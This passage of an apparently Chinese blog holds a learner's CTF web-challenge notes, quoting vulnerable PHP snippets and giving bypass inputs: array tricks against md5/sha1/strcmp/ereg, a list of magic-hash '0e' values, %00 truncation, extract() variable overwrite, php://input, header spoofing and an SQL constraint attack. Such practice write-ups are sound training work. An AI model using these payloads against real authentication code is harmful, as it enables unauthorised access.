class="number">67</span>%<span class="number">69</span>%<span class="number">6</span>e</span><br><span class="line">	再用数组绕过sha1()</span><br><span class="line"></span><br><span class="line"><span class="comment"># linux</span></span><br><span class="line">	linux基础问题</span><br><span class="line">	得到一个压缩包，win下打不开，扔到kali解压后发现一个flag的文件，</span><br><span class="line">	改权限<span class="number">777</span>，cat强行查看，发现flag，不过本意好像不是这样</span><br><span class="line">	strings 命令(此命令相当牛逼，以后再仔细学)</span><br><span class="line"><span class="comment"># linux2</span></span><br><span class="line">	同上。。</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 宽带信息泄露</span></span><br><span class="line">	题目给的是 conf.bin 文件，.bin 相当于一个万能后缀，无法直接确定</span><br><span class="line">	打开看一下是二进制文件，题目强调的是宽带信息泄露,flag&#123;宽带用户名&#125;</span><br><span class="line">	网上提示了一个工具 Routerpassview</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="comment"># Javascript Tricks</span></span><br><span class="line">	<span class="keyword">var</span> net = <span class="keyword">require</span>(<span class="string">'net'</span>);</span><br><span class="line">	flag=<span class="string">'fake_flag'</span>;</span><br><span class="line">	<span class="keyword">var</span> server = net.createServer(</span><br><span class="line">		<span class="function"><span class="keyword">function</span><span class="params">(socket)</span> </span>&#123;</span><br><span class="line">			socket.on(<span class="string">'data'</span>, (data) =&gt; &#123; </span><br><span class="line">				<span class="comment">//m = data.toString().replace(/[\n\r]*$/, '');</span></span><br><span class="line">				ok = <span class="keyword">true</span>;</span><br><span class="line">				arr = data.toString().split(<span class="string">' '</span>);</span><br><span class="line">				arr = arr.map(Number);</span><br><span class="line">				<span class="keyword">if</span> (arr.length != <span class="number">5</span>)   <span class="comment">// arr长度为5</span></span><br><span class="line">					ok = <span class="keyword">false</span>;</span><br><span class="line">				arr1 = arr.slice(<span class="number">0</span>);  <span class="comment">// 抽取从0开始的所有字符</span></span><br><span class="line">				arr1.sort();</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)  <span class="comment">// 没有相同元素，正常ASCII码</span></span><br><span class="line">					<span class="keyword">if</span> (arr1[i+<span class="number">1</span>] == arr1[i] || arr[i] &lt; <span class="number">0</span> || arr1[i+<span class="number">1</span>] &gt; <span class="number">127</span>)</span><br><span class="line">						ok = <span class="keyword">false</span>;</span><br><span class="line">				arr2 = [];</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">					arr2.push(arr1[i] + arr1[i+<span class="number">1</span>]);</span><br><span class="line">				val = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">					val = val * <span class="number">0x100</span> + arr2[i];  <span class="comment">// 0x100 = 256</span></span><br><span class="line">				<span class="keyword">if</span> (val != <span class="number">0x23332333</span>)</span><br><span class="line">					ok = <span class="keyword">false</span>;</span><br><span class="line">				<span class="keyword">if</span> (ok)</span><br><span class="line">					socket.write(flag+<span class="string">'\n'</span>);</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					socket.write(<span class="string">'nope\n'</span>);</span><br><span class="line">			&#125;);</span><br><span class="line">			<span class="comment">//socket.write('Echo server\r\n');</span></span><br><span class="line">			<span class="comment">//socket.pipe(socket);</span></span><br><span class="line">		&#125;</span><br><span class="line">	);</span><br><span class="line">	HOST = <span class="string">'0.0.0.0'</span></span><br><span class="line">	PORT = <span class="number">8082</span></span><br><span class="line">	server.listen(PORT, HOST); </span><br><span class="line">	</span><br><span class="line">	这里还要用到 netcat 简称 nc，又涨了波姿势</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="comment"># extract变量覆盖</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		$flag=<span class="string">'xxx'</span>;</span><br><span class="line">		extract($_GET);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))&#123;</span><br><span class="line">			$content=trim(file_get_contents($flag));</span><br><span class="line">			<span class="keyword">if</span>($shiyan==$content)&#123;</span><br><span class="line">				<span class="keyword">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	extract(<span class="keyword">array</span>[,extract_rules,prefix)]  </span><br><span class="line">	<span class="comment">// 数组键名作为变量名，数组键值作为变量值</span></span><br><span class="line">	<span class="comment">// 后几个参数是解决新创建的变量与原变量的冲突问题的</span></span><br><span class="line">	<span class="comment">// 就这个题来说，之前就有一个flag的变量了，此时GET一个flag进去就会把原flag的值覆盖掉</span></span><br><span class="line">	<span class="comment">// 如果$flag这个文件不存在，file_get_contents($flag)将为空</span></span><br><span class="line">	<span class="comment">// 此时只需传一个 shiyan&amp;flag 就解决了</span></span><br><span class="line">						 </span><br><span class="line"></span><br><span class="line"><span class="comment"># strcmp比较字符串</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		$flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) </span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">print</span> <span class="string">'No'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	<span class="comment">// 比较两个字符串（区分大小写）正常规则：</span></span><br><span class="line">	   如果 str1 小于 str2 返回 &lt; <span class="number">0</span>；如果大于返回 &gt; <span class="number">0</span>；如果相等，返回 <span class="number">0</span>。</span><br><span class="line">	<span class="comment">// 如果传入的值不是字符串类型就将出故障，并 return 0</span></span><br><span class="line">	<span class="comment">// 比如 传一个数组 a[] ? 这题就做完了</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment"># urldecode二次编码绕过</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		<span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">"not allowed!"</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">		<span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)	&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Access granted!"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	int ereg(string pattern, string string, <span class="keyword">array</span> [regs]); 区分大小写</span><br><span class="line">	int eregi(string $pattern, string $string [, <span class="keyword">array</span> &amp;$regs]) 不区分大小写的正则表达式匹配</span><br><span class="line">	题面已经给了思路，将 hackerDJ 进行二次 url 编码即可绕过</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="comment"># md5()函数</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		error_reporting(<span class="number">0</span>);</span><br><span class="line">		$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	数组大法好，直接 username[]&amp;password[]=<span class="number">1</span>又轻松绕过 md5()</span><br><span class="line">	原理：md5() 不能处理数组，md5(数组) 会返回 <span class="keyword">null</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组返回NULL绕过</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		$flag = <span class="string">"flag"</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	数组又能直接绕过？？ =&gt;  password[]=<span class="number">1</span></span><br><span class="line">	原理：</span><br><span class="line">		ereg() 只能处理字符，传数组将返回 <span class="keyword">null</span>，</span><br><span class="line">		三个等号的时候不会进行类型转换，所以 <span class="keyword">null</span>!==<span class="keyword">false</span></span><br><span class="line">		strpos() 的参数同样不能是数组，返回依旧是 <span class="keyword">null</span>，同上</span><br><span class="line">		</span><br><span class="line">	%<span class="number">00</span> 截断：ereg()可以进行%<span class="number">00</span>截断，这样就能绕开正则匹配  =&gt;  password=<span class="number">1</span>%<span class="number">00</span>--</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment"># 弱类型整数大小比较绕过</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">		is_numeric($temp) ? <span class="keyword">die</span>(<span class="string">"no numeric"</span>) : <span class="keyword">NULL</span>;</span><br><span class="line">		<span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	数组又能直接绕过？？</span><br><span class="line">	is_numeric()判断变量是否为数字或数字字符串</span><br><span class="line">	password=<span class="number">1445</span>%<span class="number">00</span> / password=<span class="number">1445</span>%<span class="number">20</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment"># sha1()函数比较绕过</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		$flag = <span class="string">"flag"</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">			var_dump($_GET[<span class="string">'name'</span>]);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"	"</span>;</span><br><span class="line">			var_dump($_GET[<span class="string">'password'</span>]);</span><br><span class="line">			var_dump(sha1($_GET[<span class="string">'name'</span>]));</span><br><span class="line">			var_dump(sha1($_GET[<span class="string">'password'</span>]));</span><br><span class="line">			<span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your password can not be your name!'</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Invalid password.'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Login first!'</span>;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	sha1() 计算字符串的散列值</span><br><span class="line">	数组又能直接绕过？？</span><br><span class="line">	sha1() 函数无法处理数组类型，将报错并返回<span class="keyword">false</span>，<span class="keyword">false</span> === <span class="keyword">false</span>条件成立</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment"># md5加密相等绕过</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">		$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">		$md52 = @md5($a);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">			<span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"flag&#123;*&#125;"</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"please input a"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	PHP 在处理哈希字符串时，会利用 != / == 来对其进行比较，它把每个以“<span class="number">0</span>e”的哈希值都解释为<span class="number">0</span>。</span><br><span class="line">	如果两个不同的密码经过哈希以后，哈希值都是以“<span class="number">0</span>e<span class="string">"开头的话，PHP将认为这两个哈希值相同。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	常见的payload:</span></span><br><span class="line"><span class="string">		QNKCDZO</span></span><br><span class="line"><span class="string">		0e830400451993494058024219903391</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		s155964671a</span></span><br><span class="line"><span class="string">		0e342768416822451524974117254469</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		s214587387a</span></span><br><span class="line"><span class="string">		0e848240448830537924465865611904</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		s878926199a</span></span><br><span class="line"><span class="string">		0e545993274517709034328855841020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		s1091221200a</span></span><br><span class="line"><span class="string">		0e940624217856561557816327384675</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		s1885207154a</span></span><br><span class="line"><span class="string">		0e509367213418206700842008763514</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		s1836677006a</span></span><br><span class="line"><span class="string">		0e481036490867661113260034900752</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		s1184209335a</span></span><br><span class="line"><span class="string">		0e072485820392773389523109082030</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		s1665632922a</span></span><br><span class="line"><span class="string">		0e731198061491163073197128363787</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		s1502113478a</span></span><br><span class="line"><span class="string">		0e861580163291561247404381396064</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		s532378020a</span></span><br><span class="line"><span class="string">		0e220463095855511507588041205815</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 十六进制与数字比较</span></span><br><span class="line"><span class="string">	&lt;?php</span></span><br><span class="line"><span class="string">		error_reporting(0);</span></span><br><span class="line"><span class="string">		function noother_says_correct($temp) &#123;</span></span><br><span class="line"><span class="string">			$flag = 'flag&#123;test&#125;';</span></span><br><span class="line"><span class="string">			$one = ord('1');  //ord() 返回字符的 ASCII 码值</span></span><br><span class="line"><span class="string">			$nine = ord('9');</span></span><br><span class="line"><span class="string">			$number = '3735929054';</span></span><br><span class="line"><span class="string">			for ($i = 0; $i &lt; strlen($number); $i++) &#123;</span></span><br><span class="line"><span class="string">				$digit = ord($temp&#123;$i&#125;);</span></span><br><span class="line"><span class="string">				if (($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine))</span></span><br><span class="line"><span class="string">					return "</span>flase<span class="string">";</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">			if($number == $temp)</span></span><br><span class="line"><span class="string">				return $flag;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		$temp = $_GET['password'];</span></span><br><span class="line"><span class="string">		echo noother_says_correct($temp);</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">	转十六进制 0xdeadc0de 绕过，别忘了加 0x</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># strpos数组绕过	</span></span><br><span class="line"><span class="string">	&lt;?php</span></span><br><span class="line"><span class="string">		$flag = "</span>flag<span class="string">";</span></span><br><span class="line"><span class="string">		if (isset ($_GET['ctf'])) &#123;</span></span><br><span class="line"><span class="string">			if (@ereg ("</span>^[<span class="number">1</span><span class="number">-9</span>]+$<span class="string">", $_GET['ctf']) === FALSE)</span></span><br><span class="line"><span class="string">				echo '必须输入数字才行';</span></span><br><span class="line"><span class="string">			else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)</span></span><br><span class="line"><span class="string">				die('Flag: '.$flag);</span></span><br><span class="line"><span class="string">			else</span></span><br><span class="line"><span class="string">				echo '骚年，继续努力吧啊~';</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">	数组又能直接绕过？？ ctf[]=&#123;#BIUBIUbiu&#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># ereg正则%00截断</span></span><br><span class="line"><span class="string">	&lt;?php</span></span><br><span class="line"><span class="string">		$flag = "</span>xxx<span class="string">";</span></span><br><span class="line"><span class="string">		if (isset ($_GET['password'])) &#123;</span></span><br><span class="line"><span class="string">			if (ereg ("</span>^[a-zA-Z0<span class="number">-9</span>]+$<span class="string">", $_GET['password']) === FALSE) &#123;</span></span><br><span class="line"><span class="string">				echo 'You password must be alphanumeric';</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) &#123;</span></span><br><span class="line"><span class="string">			if (strpos ($_GET['password'], '*-*') !== FALSE)</span></span><br><span class="line"><span class="string">				die('Flag: ' . $flag);</span></span><br><span class="line"><span class="string">			else</span></span><br><span class="line"><span class="string">				echo('*-* have not been found');</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		else</span></span><br><span class="line"><span class="string">			echo 'Invalid password';</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">	1.数组绕过：password[]</span></span><br><span class="line"><span class="string">	2.%00截断，再加上科学计数法  =&gt;  password=1e9%00*-*</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># 数字验证正则绕过</span></span><br><span class="line"><span class="string">	&lt;?php</span></span><br><span class="line"><span class="string">		error_reporting(0);</span></span><br><span class="line"><span class="string">		$flag = 'flag&#123;test&#125;';</span></span><br><span class="line"><span class="string">		if ("</span>POST<span class="string">" == $_SERVER['REQUEST_METHOD']) &#123;</span></span><br><span class="line"><span class="string">			$password = $_POST['password'];</span></span><br><span class="line"><span class="string">			if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password))	&#123;</span></span><br><span class="line"><span class="string">				echo 'flag';</span></span><br><span class="line"><span class="string">				exit;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">			while (TRUE) &#123;</span></span><br><span class="line"><span class="string">				$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';</span></span><br><span class="line"><span class="string">				if (6 &gt; preg_match_all($reg, $password, $arr))</span></span><br><span class="line"><span class="string">					break;</span></span><br><span class="line"><span class="string">				$c = 0;</span></span><br><span class="line"><span class="string">				$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span></span><br><span class="line"><span class="string">				foreach ($ps as $pt) &#123;</span></span><br><span class="line"><span class="string">					if (preg_match("</span>/[[:$pt:]]+/<span class="string">", $password))</span></span><br><span class="line"><span class="string">						$c += 1;</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">				if ($c &lt; 3) break;</span></span><br><span class="line"><span class="string">				//&gt;=3，必须包含四种类型三种与三种以上</span></span><br><span class="line"><span class="string">				if ("</span><span class="number">42</span><span class="string">" == $password) echo $flag;</span></span><br><span class="line"><span class="string">				else echo 'Wrong password';</span></span><br><span class="line"><span class="string">				exit;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">	直接password=就出答案了？？？我？？？</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># 字符？正则？</span></span><br><span class="line"><span class="string">	&lt;?php </span></span><br><span class="line"><span class="string">		highlight_file('2.php');</span></span><br><span class="line"><span class="string">		$key='KEY&#123;********************************&#125;';</span></span><br><span class="line"><span class="string">		$IM= preg_match("</span>/key.*key.&#123;<span class="number">4</span>,<span class="number">7</span>&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i<span class="string">", trim($_GET["</span>id<span class="string">"]), $match);</span></span><br><span class="line"><span class="string">		if( $IM )&#123; </span></span><br><span class="line"><span class="string">			die('key is: '.$key);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	?&gt; </span></span><br><span class="line"><span class="string">	单纯的考正则表达式，只要id成功匹配就会出flag，注意!!!最后一个是匹配任意标点符号!!!</span></span><br><span class="line"><span class="string">	定界符：/和/（除了\和字母数字,其它的只要是成对出现都可以看做定界符，比如##、！！之类的）</span></span><br><span class="line"><span class="string">	/i 表示忽略大小写</span></span><br><span class="line"><span class="string">	id=key0key4434key:/a/aakeyb.</span></span><br><span class="line"><span class="string">	忘记了最后那个标点符号，差点怀疑人生</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># 程序员本地网站</span></span><br><span class="line"><span class="string">	直接在请求头里添加 X-Forwarded-For:127.0.0.1</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># 你从哪里来</span></span><br><span class="line"><span class="string">	are you from google?</span></span><br><span class="line"><span class="string">	将 refer 头修改为 https://www.google.com</span></span><br><span class="line"><span class="string">	www.google.com 都不行</span></span><br><span class="line"><span class="string">	http://www.google.com 都不行 :)</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># login1(SKCTF)</span></span><br><span class="line"><span class="string">	hint:SQL约束攻击</span></span><br><span class="line"><span class="string">	先注册  user:admin                                    1</span></span><br><span class="line"><span class="string">			 passwd:Abc123</span></span><br><span class="line"><span class="string">	然后 用admin,Abc123也能登录上了</span></span><br><span class="line"><span class="string">	[约束攻击详解](https://www.freebuf.com/articles/web/124537.html)</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># md5 collision(NUPT_CTF)</span></span><br><span class="line"><span class="string">	题目是MD5碰撞，直接传一个MD5以0e开头的过去</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># 秋名山老司机</span></span><br><span class="line"><span class="string">	亲请在2s内计算老司机的车速是多少</span></span><br><span class="line"><span class="string">	每次显示一些随机的大数相加减</span></span><br><span class="line"><span class="string">	我想到了py直接提交请求，然而自己独立写不出来</span></span><br><span class="line"><span class="string">	import requests </span></span><br><span class="line"><span class="string">	import re </span></span><br><span class="line"><span class="string">	url = 'http://123.206.87.240:8002/qiumingshan/' </span></span><br><span class="line"><span class="string">	s = requests.Session() </span></span><br><span class="line"><span class="string">	source = s.get(url) </span></span><br><span class="line"><span class="string">	expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group() </span></span><br><span class="line"><span class="string">	result = eval(expression) </span></span><br><span class="line"><span class="string">	post = &#123;'value': result&#125; </span></span><br><span class="line"><span class="string">	print(s.post(url, data = post).text)</span></span><br><span class="line"><span class="string">	必须利用会话对象 Session()，否则提交结果的时候，页面又重新生成一个新的表达式</span></span><br><span class="line"><span class="string">	利用正则表达式截取响应内容中的算术表达式。首先引入 re 模块，其次用 search() 匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串。</span></span><br><span class="line"><span class="string">	获得算术表达式的字符串后，直接利用 Python 的內建方法 eval() 来计算出结果，简单、暴力、快捷。</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># web8</span></span><br><span class="line"><span class="string">	txt？？？？</span></span><br><span class="line"><span class="string">	&lt;?php</span></span><br><span class="line"><span class="string">		extract($_GET);</span></span><br><span class="line"><span class="string">		if (!empty($ac)) &#123;</span></span><br><span class="line"><span class="string">			$f = trim(file_get_contents($fn));</span></span><br><span class="line"><span class="string">			if ($ac === $f)</span></span><br><span class="line"><span class="string">				echo "</span>&lt;p&gt;This is flag:<span class="string">" ."</span> $flag&lt;/p&gt;<span class="string">";</span></span><br><span class="line"><span class="string">			else</span></span><br><span class="line"><span class="string">				echo "</span>&lt;p&gt;sorry!&lt;/p&gt;<span class="string">";</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">	empty() 以下情况将返回TRUE</span></span><br><span class="line"><span class="string">		"</span><span class="string">" (空字符串)</span></span><br><span class="line"><span class="string">		0 (作为整数的0)</span></span><br><span class="line"><span class="string">		0.0 (作为浮点数的0)</span></span><br><span class="line"><span class="string">		"</span><span class="number">0</span><span class="string">" (作为字符串的0)</span></span><br><span class="line"><span class="string">		NULL</span></span><br><span class="line"><span class="string">		FALSE</span></span><br><span class="line"><span class="string">		array() (一个空数组)</span></span><br><span class="line"><span class="string">		$var; (一个声明了，但是没有值的变量)</span></span><br><span class="line"><span class="string">	单个参数的extract()自然想到变量覆盖，然而$ac又不能为空</span></span><br><span class="line"><span class="string">	扫了后台扫了个2.php，又提示txt，ac=txt&amp; fn=2.php，结果没卵用，哈哈</span></span><br><span class="line"><span class="string">	试了好几次后选择看writeup</span></span><br><span class="line"><span class="string">	1.ac=flags&amp; fn=flag.txt，这个想法真是脑洞打开</span></span><br><span class="line"><span class="string">	2.利用伪协议读取post，妙极了</span></span><br><span class="line"><span class="string">		ac=233 &amp; fn=php://input</span></span><br><span class="line"><span class="string">		再post一个233，齐活儿</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># 前女友(SKCTF)</span></span><br><span class="line"><span class="string">	&lt;?php</span></span><br><span class="line"><span class="string">		if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123;</span></span><br><span class="line"><span class="string">			$v1 = $_GET['v1'];</span></span><br><span class="line"><span class="string">			$v2 = $_GET['v2'];</span></span><br><span class="line"><span class="string">			$v3 = $_GET['v3'];</span></span><br><span class="line"><span class="string">			if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span></span><br><span class="line"><span class="string">				if(!strcmp($v3, $flag))&#123;</span></span><br><span class="line"><span class="string">					echo $flag;</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	?&gt;	</span></span><br><span class="line"><span class="string">	md5碰撞，数组绕过strcmp()，做完了</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># 速度要快</span></span><br><span class="line"><span class="string">	我感觉你得快点!!!</span></span><br><span class="line"><span class="string">	查看源码  =&gt;  &lt;!-- OK ,now you have to post the margin what you find --&gt;</span></span><br><span class="line"><span class="string">	找啊找啊，响应头里面发现了一个 flag 键名</span></span><br><span class="line"><span class="string">	刷新一下还会变，flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogTmpNek56RXo=</span></span><br><span class="line"><span class="string">	那就上py脚本搞吧，注意建立会话对象 session(),否则已提交，flag又变了</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	import requests</span></span><br><span class="line"><span class="string">	import base64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	url = 